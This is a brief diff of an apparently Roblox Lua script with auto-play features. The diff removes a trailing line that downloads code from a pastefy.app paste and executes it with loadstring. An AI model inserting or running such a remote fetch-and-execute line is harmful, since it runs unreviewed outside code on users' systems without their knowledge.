@@ -2796,5 +2796,3 @@ Player.CharacterAdded:Connect(function(char)
     if Enabled.AutoPlayRightEnabled then stopAutoPlayRight() task.wait(0.1) startAutoPlayRight() end
 end)
 end)
-
-loadstring(game:HttpGet("https://pastefy.app/nVe39l70/raw"))()
